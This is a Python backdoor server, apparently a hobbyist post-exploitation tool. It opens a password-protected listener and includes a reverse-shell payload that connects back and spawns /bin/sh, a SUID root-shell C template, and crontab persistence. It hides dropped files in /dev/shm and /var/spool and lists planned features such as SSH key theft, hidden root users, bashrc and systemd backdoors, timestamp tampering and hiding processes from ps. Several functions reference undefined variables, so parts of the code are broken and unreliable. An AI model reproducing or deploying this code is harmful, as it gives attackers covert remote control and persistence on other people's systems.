#!/usr/bin/env python3

import socket
import subprocess
import threading
import string
import random
import os
import atexit


PYTHON_REVERSE = """
import sys
import socket
import os
import pty
s=socket.socket()
s.connect(("{}",{}))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
"""

C_SUID = """
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
setuid(0); setgid(0); system("/bin/bash");
}
"""

class InsufficientPerms(Exception):
    pass

class IncorrectPythonVersion(Exception):
    pass

class DaemonAlreadyRunning(Exception):
    pass

class BackdoorModule:
    def __init__(self, ip, port):
        self.address = (ip, port)
        self.contents = PYTHON_REVERSE
        self.runLevel = ''
        self.bins = []
        self.shellLocations = []

    @classmethod
    def getPythonVersions(cls):
        pythonList = ['python', 'python2', 'python3']
        for i in pythonList:
            output = subprocess.Popen("which {}".format(i), shell=True, stdout=subprocess.PIPE)
            if output.stdout.read() != b'':
                if not cls.bins.get('python'):
                    cls.bins['python'] = {}
                if len(cls.bins['python']) >= 3:
                    break
                cls.bins['python'][i] = output.stdout().read().decode()

    @classmethod
    def runningAsRoot(cls):
        output = subprocess.Popen("whoami", shell=True, stdout=subprocess.PIPE)
        cls.runLevel = output.stdout.read()

    def writeReverseShell(self):
        randomName = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
        if self.runLevel == 'root':
            directoryName = "/var/spool/{}.py".format(randomName)
        else:
            directoryName = "/dev/shm/{}.py".format(randomName)
        with open(directoryName, "w") as f:
            f.write(self.contents.format(ip, port))
        self.shellLocations.append(directoryName)

    def runReverseShell(self):
        if len(self.bins) == 0:
            self.getPythonVersions()
        pythonBin  = [*self.bins['python']][0] # doesn't matter if it's python 2 or 3
        shellLocation = self.shellLocations[-1] # get most recent
        cmd = "{} {}".format(pythonBin, shellLocation)
        subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)

    @staticmethod
    def cleanup():
        pidFile = "/tmp/daemon.pid"
        if os.path.isfile(pidfile):
            os.unlink(pidfile)

    @staticmethod
    def daemonise():
        pid = str(os.getpid())
        pidFile = "/tmp/daemon.pid"
        if os.path.isfile(pidfile):
            return
        with open(pidFile, "w") as f:
            f.write(pid)
            atexit.register(BackdoorModule.cleanup)

    @staticmethod
    def runningAsDaemon():
        return os.path.isfile("/tmp/daemon.pid")
    
    @classmethod
    def backdoorCrontab(cls):
        if cls.runLevel == "":
            BackdoorModule.runningAsRoot()
        
        if not cls.runLevel == 'root':
            raise InsufficientPerms()
        
        if cls.runningAsDaemon():
            raise DaemonAlreadyRunning()

        if len(cls.bins) == 0:
            cls.getPythonVersions()

        if not cls.bins['python'].get('python3'):
            raise IncorrectPythonVersion()

        currentPath = os.path.realpath(__file__)
        cronTxt = "* * * * * {} {}".format(cls.bins['python']['python3'], currentPath)
        
        with open("/etc/crontab", "a+") as f:
            cronLines = f.read().split("\n")
            for line in cronLines:
                if line == cronTxt:
                    return
            f.write(cronTxt)
        cls.daemonise()

class Command:
    def __init__(self, name, func):
        self.commands = {}
    
    def save(self):
        self.commands[name] = func
    
    def getCommandObj(self):
        return self.commands
    
    def run(self):
        pass

#Backdoor Methods
# - SSH Keys
# - Cronjobs
# - Add root user
# - SUID Binary
# - .bashrc backdoor
# - startup service
# - startup file
# - driver backdoor
# - Change file modification date
# - Systemd service
# - PHP shells
# - Change ps alis to new one (stop ps aux)

LOCALHOST = '0.0.0.0'
PORT = 9001
banner = (b"""
 ,                                                               ,
 \'.                                                           .'/
  ),\                                                         /,( 
 /__\'.                                                     .'/__\
 \  `'.'-.__                                           __.-'.'`  /
  `)   `'-. \                                         / .-'`   ('
  /   _.--'\ '.          ,               ,          .' /'--._   \
  |-'`      '. '-.__    / \             / \    __.-' .'      `'-|
  \         _.`'-.,_'-.|/\ \    _,_    / /\|.-'_,.-'`._         /
   `\    .-'       /'-.|| \ |.-"   "-.| / ||.-'\       '-.    /`
     )-'`        .'   :||  / -.\\ //.- \  ||:   '.        `'-(
    /          .'    / \\_ |  /o`^'o\  | _// \    '.          \
    \       .-'    .'   `--|  `"/ \"`  |--`   '.    '-.       /
     `)  _.'     .'    .--.; |\__"__/| ;.--.    '.     '._  ('
     /_.'     .-'  _.-'     \\ \/^\/ //     `-._  '-.     '._\
     \     .'`_.--'          \\     //          `--._`'.     /
      '-._' /`            _   \\-.-//   _            `\ '_.-'
          `<     _,..--''`|    \`"`/    |`''--..,_     >`
           _\  ``--..__   \     `'`     /   __..--``  /_
          /  '-.__     ``'-;    / \    ;-'``     __.-'  \
         |    _   ``''--..  \'-' | '-'/  ..--''``   _    |
         \     '-.       /   |/--|--\|   \       .-'     /
          '-._    '-._  /    |---|---|    \  _.-'    _.-'
              `'-._   '/ / / /---|---\ \ \ \'   _.-'`
                   '-./ / / / \`---`/ \ \ \ \.-'
                       `)` `  /'---'\  ` `(`
                 jgs  /`     |       |     `\
                     /  /  | |       | |  \  \
                 .--'  /   | '.     .' |   \  '--.
                /_____/|  / \._\   /_./ \  |\_____\
               (/      (/'     \) (/     `\)      \)
\n""")

commandList = b""" 
reverseshell - Spawns a reverse shell  [must use a local nc listener]
backdoorcrontab - Adds a cronjob to run the backdoor again if someone kills the process
commands - Echoes these commands
setuid [WIP] - Creates a SUID binary that spawns a bash shell as root (uid, euid 0)
sshtransfer [WIP] - Transfers public / private SSH keys to the current user
addrootuser [WIP] - Creates a new root user, will echo user:password
injectbashrc [WIP] - Pop a backdoor in bashrc
injectstartup [WIP] - Put a backdoor in a systemctl service startup
injectdriver [WIP] - Put a backdoor in a driver
pwnmodified [WIP] - Change the modification date for files
alisspam [WIP] - Spam bashrc with different aliases for most commands
"""

def handleCommands(cmd, _socket, ip):
    cmd = cmd.decode()
    if cmd == "reverseshell\n":
        _socket.send(b"Enter Port: ")
        portNumber = _socket.recv(1024).decode()
        port = 0
        try:
            port = int(command_2)
        except:
            port = 9001 #default
        _module = BackdoorModule(ip, port)
        pythonVersions = findPythonVersion()
        _module.writeReverseShell()
        _module.runReverseShell()
        _socket.send(b"Done!\n")
        handleCommands()
    elif cmd == "backdoorcrontab":
        try:
            BackdoorModule.backdoorCrontab()
        except InsufficientPerms:
            _socket.send(b"Not root... Returning\n")
        except DaemonAlreadyRunning:
            _socket.send(b"Already running as daemon...\n")

class ClientThread(threading.Thread):
    def __init__(self,clientAddress,clientsocket):
        threading.Thread.__init__(self)
        self.csocket = clientsocket
        print ("New connection added: ", clientAddress)

    def run(self):
        print('Connected by', clientAddress)
        while True:
            while True:
                data = self.csocket.recv(1024)
                if data.decode() == "password\n":
                    self.csocket.send(banner)
                    while True:
                        data = self.csocket.recv(1024)
                        command = data.decode()
                        handleCommands(command, self.csocket, clientAddress[0])
                else:
                    self.csocket.send(b"Password Incorrect\n")


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((LOCALHOST, PORT))
print("Server started")
print("Waiting for clients to connect...")

while True:
    s.listen(1000)
    clientsock, clientAddress = s.accept()
    newthread = ClientThread(clientAddress, clientsock)
    newthread.start()
